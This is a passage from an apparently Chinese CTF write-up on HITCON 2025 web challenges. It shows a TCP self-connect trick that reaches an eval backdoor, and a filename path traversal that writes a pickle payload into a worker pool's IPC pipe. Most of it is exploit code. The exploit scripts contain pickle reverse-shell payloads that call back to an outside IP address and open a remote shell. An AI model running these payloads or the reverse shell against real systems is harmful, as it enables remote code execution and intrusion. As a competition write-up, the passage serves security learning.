class="variable">$fp</span>, <span class="number">1</span>);</span><br><span class="line">	    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>));  <span class="comment">//如果连接成功，使用fwrite()将当前请求的原始POST数据发送到该连接</span></span><br><span class="line">	    <span class="variable">$data</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>);  <span class="comment">//从连接中读取一行数据</span></span><br><span class="line">	    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	    	<span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$data</span>);</span><br><span class="line">	    	<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>-&gt;signal) &amp;&amp; <span class="variable">$data</span>-&gt;signal == <span class="string">&#x27;Arrival&#x27;</span>)</span><br><span class="line">	    		<span class="keyword">eval</span>(<span class="variable">$data</span>-&gt;logogram);</span><br><span class="line">	    	</span><br><span class="line">	    	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	    	<span class="keyword">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>离谱，竟然burp直接爆破probe就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /?probe=$40446$ HTTP/1.1</span><br><span class="line">Host: no-mans-echo.chal.hitconctf.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 54</span><br><span class="line"></span><br><span class="line">&#123;&quot;signal&quot;:&quot;Arrival&quot;,&quot;logogram&quot;:&quot;system(&#x27;cat /flag&#x27;);&quot;&#125;</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sun, 24 Aug 2025 14:28:17 GMT</span><br><span class="line">Server: Apache/2.4.62 (Debian)</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 124</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">hitcon&#123;it&#x27;s a beautiful day outside. birds are singing, flowers are blooming... kids like you... should be burning in h3ll&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查资料看到了TCP自连接这个概念，恍然大悟，先补充一下这个知识</p>
<p>新建一个脚本 self_connect.sh，内容如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	telnet 127.0.0.1 50000</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>执行这段脚本之前先用 netstat 等命令确认 50000 没有进程监听。然后执行脚本，经过一段时间，telnet 居然成功了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Trying 127.0.0.1...</span><br><span class="line">telnet: connect to address 127.0.0.1: Connection refused</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">telnet: connect to address 127.0.0.1: Connection refused</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">Connected to 127.0.0.1.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br></pre></td></tr></table></figure>

<p>使用 netstat 查看当前的 50000 端口的连接状况，如下所示。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 127.0.0.1:50000         127.0.0.1:50000         ESTABLISHED 24786/telnet</span><br></pre></td></tr></table></figure>

<p>可以看到源 IP、源端口是 127.0.0.1:50000，目标 IP、目标端口也是 127.0.0.1:50000，通过上面的脚本，我们连上了本来没有监听的端口号。</p>
<p>这是因为当一方主动发起连接时，操作系统会自动分配一个临时端口号给连接主动发起方。如果刚好分配的临时端口是 50000 端口，就会出现上面的情形，过程如下。<br><img src="/2025/08/24/HITCON-2025/1.png" alt="alt text"><br>前四个包的交互过程就是 TCP 同时打开的过程。<br>第一个包是发送 SYN 包给 50000 端口<br>对于发送方而言，它收到了这个 SYN 包，以为对方是想同时打开，会回复 SYN+ACK<br>回复 SYN+ACK 以后，它自己就会收到这个 SYN+ACK，以为是对方回的，对它而言已握手成功，进入 ESTABLISHED 状态。</p>
<p>因此，我们爆破probe的过程实际上就是在找这个临时端口</p>
<p>可以通过这行命令来观察TCP自连接的过程</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> <span class="built_in">echo</span> 123 | nc 127.0.0.1 50000; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">(UNKNOWN) [127.0.0.1] 50000 (?) : Connection refused</span><br><span class="line">(UNKNOWN) [127.0.0.1] 50000 (?) : Connection refused</span><br><span class="line">(UNKNOWN) [127.0.0.1] 50000 (?) : Connection refused</span><br><span class="line">(UNKNOWN) [127.0.0.1] 50000 (?) : Connection refused</span><br><span class="line">(UNKNOWN) [127.0.0.1] 50000 (?) : Connection refused</span><br><span class="line">123</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因此当我们向这个临时端口发送<code>&#123;&quot;signal&quot;:&quot;Arrival&quot;,&quot;logogram&quot;:&quot;system(&#39;cat /flag&#39;);&quot;&#125;</code>时，fgets应该就会从连接中读取到这行数据，从而进入到eval中</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"></span><br><span class="line">targ = <span class="string">&quot;http://no-mans-echo.chal.hitconctf.com/&quot;</span></span><br><span class="line"></span><br><span class="line">c = httpx.Client(base_url=targ)</span><br><span class="line"></span><br><span class="line">COMMAND_TO_RUN = <span class="string">&quot;readfile(&#x27;/flag&#x27;);&quot;</span> </span><br><span class="line">payload = <span class="string">f&#x27;&#123;&#123;&quot;signal&quot;: &quot;Arrival&quot;, &quot;logogram&quot;: &quot;<span class="subst">&#123;COMMAND_TO_RUN&#125;</span>&quot;&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40_000</span>, <span class="number">50_000</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r = c.post(<span class="string">f&quot;/?probe=<span class="subst">&#123;i&#125;</span>&quot;</span>, content=payload.encode())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;hitcon&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h2 id="IMGC0NV"><a href="#IMGC0NV" class="headerlink" title="IMGC0NV"></a>IMGC0NV</h2><p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, g</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_image</span>(<span class="params">args</span>):</span><br><span class="line">    file_data, filename, output_format, temp_dir = args</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> Image.<span class="built_in">open</span>(io.BytesIO(file_data)) <span class="keyword">as</span> img:</span><br><span class="line">            <span class="keyword">if</span> img.mode != <span class="string">&quot;RGB&quot;</span>:</span><br><span class="line">                img = img.convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            filename = safe_filename(filename)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;filename: <span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">            orig_ext = filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            ext = output_format.lower()</span><br><span class="line">            <span class="keyword">if</span> orig_ext:</span><br><span class="line">                out_name = filename.replace(orig_ext, ext, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                out_name = <span class="string">f&quot;<span class="subst">&#123;filename&#125;</span>.<span class="subst">&#123;ext&#125;</span>&quot;</span></span><br><span class="line">            output_path = os.path.join(temp_dir, out_name)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;content: <span class="subst">&#123;f&#125;</span>&quot;</span>)</span><br><span class="line">                img.save(f, <span class="built_in">format</span>=output_format)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> output_path, out_name, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, filename, <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_filename</span>(<span class="params">filename</span>):</span><br><span class="line">    filneame = filename.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;_&quot;</span>).replace(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;_&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 5 MB</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>():</span><br><span class="line">    g.pool = Pool(processes=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/convert&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_images</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;files&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No files&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    files = request.files.getlist(<span class="string">&#x27;files&#x27;</span>)</span><br><span class="line">    output_format = request.form.get(<span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;&#x27;</span>).upper()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> files <span class="keyword">or</span> <span class="keyword">not</span> output_format:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid input&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> tempfile.TemporaryDirectory() <span class="keyword">as</span> temp_dir:</span><br><span class="line">        file_data = []</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> file.filename:</span><br><span class="line">                file_data.append(</span><br><span class="line">                    (file.read(), file.filename, output_format, temp_dir)</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> file_data:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No valid images&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        results = <span class="built_in">list</span>(g.pool.<span class="built_in">map</span>(convert_image, file_data))</span><br><span class="line"></span><br><span class="line">        successful = []</span><br><span class="line">        failed = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> path, name, error <span class="keyword">in</span> results:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> error:</span><br><span class="line">                successful.append((path, name))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                failed.append((name <span class="keyword">or</span> <span class="string">&#x27;unknown&#x27;</span>, error))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> successful:</span><br><span class="line">            error_msg = <span class="string">&quot;All conversions failed. &quot;</span> + \</span><br><span class="line">                <span class="string">&quot;; &quot;</span>.join([<span class="string">f&quot;<span class="subst">&#123;f&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span> <span class="keyword">for</span> f, e <span class="keyword">in</span> failed])</span><br><span class="line">            <span class="keyword">return</span> error_msg, <span class="number">500</span></span><br><span class="line"></span><br><span class="line">        zip_buffer = io.BytesIO()</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(zip_buffer, <span class="string">&#x27;w&#x27;</span>, zipfile.ZIP_DEFLATED) <span class="keyword">as</span> zf:</span><br><span class="line">            <span class="keyword">for</span> path, name <span class="keyword">in</span> successful:</span><br><span class="line">                zf.write(path, name)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> failed:</span><br><span class="line">                summary = <span class="string">f&quot;Conversion Summary:\nSuccessful: <span class="subst">&#123;<span class="built_in">len</span>(successful)&#125;</span>\nFailed: <span class="subst">&#123;<span class="built_in">len</span>(failed)&#125;</span>\n\nFailures:\n&quot;</span></span><br><span class="line">                summary += <span class="string">&quot;\n&quot;</span>.join([<span class="string">f&quot;- <span class="subst">&#123;f&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span> <span class="keyword">for</span> f, e <span class="keyword">in</span> failed])</span><br><span class="line">                zf.writestr(<span class="string">&quot;errors.txt&quot;</span>, summary)</span><br><span class="line"></span><br><span class="line">        zip_buffer.seek(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> send_file(zip_buffer,</span><br><span class="line">                         mimetype=<span class="string">&#x27;application/zip&#x27;</span>,</span><br><span class="line">                         as_attachment=<span class="literal">True</span>,</span><br><span class="line">                         download_name=<span class="string">f&#x27;converted_<span class="subst">&#123;output_format.lower()&#125;</span>.zip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>文件名可控、文件内容有格式限制的任意文件写漏洞。</p>
<p>文件是通过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    img.save(f, <span class="built_in">format</span>=output_format)</span><br></pre></td></tr></table></figure>
<p>写入的，因此表单中提交的后缀名只能是img.save允许的，并且文件的内容需要是合法图片</p>
<p>学习了一下discord老哥们的做法，用GPT整理了思路</p>
<p><strong>攻击为何能成立（高层视图）</strong></p>
<ol>
<li>进程池用 Pickle 做 IPC<blockquote>
<p><code>g.pool.map(convert_image, file_data)</code> 会把 <code>(file_bytes, filename, fmt, temp_dir)</code> 这个参数包序列化后，通过 Queue&#x2F;管道 发给子进程；子进程取到后再 <code>pickle.loads(...)</code> 还原为 Python 对象去调用 convert_image。同理，子进程把返回值再 picke 化发回父进程。<br>也就是说，父进程→子进程（任务）和子进程→父进程（结果）两条通道，都会调用 <code>_ForkingPickler.loads(...)</code> 来还原对象。</p>
</blockquote>
</li>
<li>你能往这些通道写任意字节<blockquote>
<p>应用里的”保存输出图像文件”的路径完全被攻击者控制（safe_filename 返回原值，且用了 os.path.join(temp_dir, out_name)，当 out_name 以 &#x2F; 开头就变成了绝对路径，.. 也不会被清理）。<br>于是攻击者把输出路径伪造成 <code>/proc/self/fd/&lt;N&gt;</code>，从而让 <code>img.save(..., f)</code> 实际上往当前子进程的某个文件描述符 <code>&lt;N&gt;</code> 直接写字节。只要 <code>&lt;N&gt;</code> 正好是进程池 IPC 用到的管道端点（比如子进程用于”给父进程回包”的那端），你写进去的就会被另一端当作一条”消息”去 <code>pickle.loads(...)</code>。</p>
</blockquote>
</li>
<li>一旦另一端 loads，就跑进你的 RCE payload<blockquote>
<p>Pickle 是可执行反序列化：你脚本里的 payload 形如 <code>cbuiltins\nexec\n(V...tR</code>，被 loads 后会直接 exec(…)，建立反弹 shell。</p>
</blockquote>
</li>
</ol>
<p>exp1.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</span><br><span class="line"></span><br><span class="line">CONV_URL = <span class="string">&#x27;http://127.0.0.1:5000/convert&#x27;</span></span><br><span class="line"></span><br><span class="line">width, height = <span class="number">65535</span>, <span class="number">159</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height), <span class="string">&#x27;black&#x27;</span>)</span><br><span class="line"></span><br><span class="line">draw = ImageDraw.Draw(img)</span><br><span class="line"></span><br><span class="line">draw.rectangle([(<span class="number">65504</span>, <span class="number">3</span>), (<span class="number">65505</span>, <span class="number">3</span>)], fill=<span class="string">&#x27;#0000FF&#x27;</span>) <span class="comment"># size=0xFFFF (0xFF x 2px)</span></span><br><span class="line">payload = <span class="string">b&#x27;cbuiltins\nexec\n(Vimport socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;vps&quot;,port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);\ntR....&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(payload):</span><br><span class="line">    draw.rectangle([</span><br><span class="line">        ((<span class="number">65506</span> + i) % width, <span class="number">3</span> - (<span class="number">65506</span> + i) // width),</span><br><span class="line">        ((<span class="number">65506</span> + i) % width, <span class="number">3</span> - (<span class="number">65506</span> + i) // width)</span><br><span class="line">    ], fill=<span class="string">&#x27;#FFFF%02X&#x27;</span> % (c))</span><br><span class="line"></span><br><span class="line">img.save(<span class="string">&#x27;pixel.png&#x27;</span>, <span class="string">&#x27;PNG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pixel.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    fd = <span class="number">10</span></span><br><span class="line">    path = <span class="string">f&#x27;/proc/self/fd/<span class="subst">&#123;fd&#125;</span>&#x27;</span></span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&#x27;files&#x27;</span>: (<span class="string">f&#x27;/usr/local/lib/python3.13/w<span class="subst">&#123;path&#125;</span>ref/../../../../../../../../../../.<span class="subst">&#123;path&#125;</span>&#x27;</span>, f)</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(CONV_URL, files=files, data=&#123;<span class="string">&#x27;format&#x27;</span>: <span class="string">&#x27;SGI&#x27;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.status_code)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p>另外这里文件名的构造也比较讲究，比如上面这个脚本，选定了将图片替换为sgi格式，我们可以看看这个文件名是怎么变化的<br>raw: &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.13&#x2F;w&#x2F;proc&#x2F;self&#x2F;fd&#x2F;10ref&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;.&#x2F;proc&#x2F;self&#x2F;fd&#x2F;10<br>由于safe_filename里面有拼写错误，所以没有过滤效果<br>然后提取出后缀，这里是&#x2F;proc&#x2F;self&#x2F;fd&#x2F;10<br>之后经过<code>out_name = filename.replace(orig_ext, ext, 1)</code><br>将&#x2F;proc&#x2F;self&#x2F;fd&#x2F;10第一次出现的位置替换为sgi<br>after: &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.13&#x2F;wsgiref&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;.&#x2F;proc&#x2F;self&#x2F;fd&#x2F;10<br>最终相当于&#x2F;proc&#x2F;self&#x2F;fd&#x2F;10<br>这里比较关键的一点是要找到一个存在的路径里面包含sgi，比如这里的&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.13&#x2F;wsgiref</p>
<p>顺手记录其它师傅的脚本，主要看怎么把pickle插到图片里的</p>
<p>exp2.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">obj = <span class="string">&quot;test&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Meow</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">exec</span>, (<span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.120.14.151&quot;,9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span>,))</span><br><span class="line">  </span><br><span class="line">payload =  pickle.dumps(Meow(), protocol=pickle.HIGHEST_PROTOCOL)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">W, H = <span class="number">8771</span>, <span class="number">5903</span> </span><br><span class="line"></span><br><span class="line">tail = payload</span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (W, H), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">row = []</span><br><span class="line">pad_len = (-<span class="built_in">len</span>(tail)) % <span class="number">3</span></span><br><span class="line">data = tail + <span class="string">b&quot;\x00&quot;</span> * pad_len</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), 